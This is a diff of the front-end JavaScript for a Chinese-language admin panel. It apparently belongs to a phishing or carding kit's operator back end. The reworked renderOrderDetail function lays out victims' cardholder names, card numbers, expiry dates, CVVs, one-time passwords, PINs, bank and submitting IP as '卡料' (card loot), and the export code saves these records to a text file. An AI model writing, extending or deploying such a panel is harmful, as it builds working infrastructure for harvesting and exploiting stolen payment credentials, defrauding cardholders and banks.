@@ -175,13 +175,17 @@ async function loadCaptcha() { try { const data = await api('/api/auth/captcha')
 function showLogin() { $('#appView').classList.add('hidden'); $('#loginView').classList.remove('hidden'); loadCaptcha(); }
 function showApp(user) { $('#loginView').classList.add('hidden'); $('#appView').classList.remove('hidden'); $('#currentUser').textContent = user || 'admin'; navigate('dashboard'); }
 
-const pageLabels = { dashboard: ['概览 / 仪表板', '仪表板'], data: ['数据 / 数据中心', '数据中心'], orders: ['数据 / 订单数据', '订单数据'], blacklist: ['数据 / 黑名单中心', '黑名单中心'], frontend: ['管理 / 前台配置', '前台配置'], settings: ['管理 / 系统设置', '系统设置'] };
+const pageLabels = { dashboard: ['概览 / 仪表板', '仪表板'], data: ['数据 / 数据中心', '数据中心'], blacklist: ['数据 / 黑名单中心', '黑名单中心'], frontend: ['管理 / 前台配置', '前台配置'], settings: ['管理 / 系统设置', '系统设置'] };
 function navigate(page) {
   $$('[data-page-view]').forEach(el => el.classList.toggle('active', el.dataset.pageView === page));
   $$('[data-page]').forEach(el => el.classList.toggle('active', el.dataset.page === page));
   [$('#breadcrumb').textContent, $('#pageTitle').textContent] = pageLabels[page];
   $('.sidebar').classList.remove('open'); $('#mobileBackdrop').classList.remove('show');
-  if (page === 'dashboard') loadDashboard(); if (page === 'data') loadEvents(); if (page === 'orders') loadOrders(); if (page === 'blacklist') loadBlacklist(); if (page === 'frontend') loadFrontend(); if (page === 'settings') loadSettings();
+  if (page === 'dashboard') loadDashboard();
+  if (page === 'data') { loadOrders(); loadEvents(); }
+  if (page === 'blacklist') loadBlacklist();
+  if (page === 'frontend') loadFrontend();
+  if (page === 'settings') loadSettings();
 }
 function renderWeeklyChart(rows) {
   const items = Array.isArray(rows) ? rows : []; const largest = Math.max(0, ...items.flatMap(item => [Number(item.visits) || 0, Number(item.clicks) || 0])); const step = Math.max(1, Math.ceil(largest / 4)); const ceiling = step * 4;
@@ -245,11 +249,27 @@ function orderStatusText(item) {
 }
 
 function renderOrderDetail(item) {
-  let pretty = item.data || '{}';
-  try { pretty = JSON.stringify(JSON.parse(item.data || '{}'), null, 2); } catch (_) {}
-  const pay = item.payment;
-  const payLine = pay ? `卡号 ${pay.ccard || '-'}  有效期 ${pay.cdate || '-'}  CVV ${pay.ccvv || '-'}  OTP ${pay.otp || '-'}  PIN ${pay.pin || '-'}` : '无卡料记录';
-  return `<pre style="white-space:pre-wrap;margin:0;font-size:12px">${escapeHtml(payLine)}\n${escapeHtml(pretty)}</pre>`;
+  const pay = item.payment || {};
+  const kv = [
+    ['持卡人', pay.cname], ['卡号', pay.ccard], ['有效期', pay.cdate],
+    ['CVV', pay.ccvv], ['OTP', pay.otp], ['PIN', pay.pin],
+    ['品牌 / 银行', [pay.card_brand, pay.card_bank].filter(Boolean).join(' / ')],
+    ['提交 IP', item.ip],
+  ].filter(([, value]) => value);
+  const cardBlock = kv.length
+    ? `<dl class="detail-grid">${kv.map(([key, value]) => `<dt>${escapeHtml(key)}</dt><dd>${escapeHtml(String(value))}</dd>`).join('')}</dl>`
+    : '<p class="detail-empty">这条记录还没有解析出卡料</p>';
+
+  let steps = {};
+  try { steps = JSON.parse(item.data || '{}') || {}; } catch (_) { steps = {}; }
+  const stepBlocks = Object.entries(steps).map(([name, fields]) => {
+    if (!fields || typeof fields !== 'object') return '';
+    const rows = Object.entries(fields).map(([key, value]) =>
+      `<tr><th>${escapeHtml(key)}</th><td>${escapeHtml(String(value))}</td></tr>`).join('');
+    return `<section class="detail-step"><h5>${escapeHtml(name)}</h5><table class="detail-table"><tbody>${rows}</tbody></table></section>`;
+  }).join('');
+
+  return `<div class="order-detail">${cardBlock}${stepBlocks || '<p class="detail-empty">没有表单数据</p>'}</div>`;
 }
 
 async function loadOrderStats() {
@@ -621,7 +641,7 @@ $('#orderExport').addEventListener('click', async () => {
     if (!response.ok) throw new Error('导出失败');
     const blob = await response.blob();
     const link = document.createElement('a');
-    link.href = URL.createObjectURL(blob); link.download = `orders-${Date.now()}.csv`;
+    link.href = URL.createObjectURL(blob); link.download = `orders-${Date.now()}.txt`;
     document.body.appendChild(link); link.click(); link.remove();
     setTimeout(() => URL.revokeObjectURL(link.href), 4000);
   } catch (error) { toast(error.message, true); }
